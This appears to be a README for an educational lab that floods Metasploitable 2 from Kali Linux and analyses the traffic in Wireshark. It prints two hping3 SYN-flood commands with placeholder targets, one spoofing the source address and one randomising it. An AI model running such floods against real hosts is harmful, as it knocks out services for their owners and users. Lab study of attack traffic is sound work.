 # 🛡️ DDoS Simulation Lab: Kali Linux → Metasploitable 2

This project demonstrates a simulated **DDoS attack** against a vulnerable Linux machine using **Kali Linux**, with traffic captured and analyzed via **Wireshark**.

## ⚠️ LEGAL NOTICE
This simulation was conducted in a fully **offline lab environment** for educational purposes only.

---

## 🔧 Lab Setup
- Kali Linux (Attacker Machine)
- Metasploitable 2 (Target Machine)
- Wireshark
- dvwa (for checking ir time crash)
 
---

## 🎯 Objective
- Simulate DDoS using `hping3`
- Capture traffic using Wireshark
- Analyze attack signature and behavior

---

## 🧪 Attack Command Used
```bash
hping3 -S <TARGET_IP> -a <Spoof_IP> -p <port no> --flood
hping3 -S <TARGET_IP> -d <data size> -p <port no> --flood --rand-source
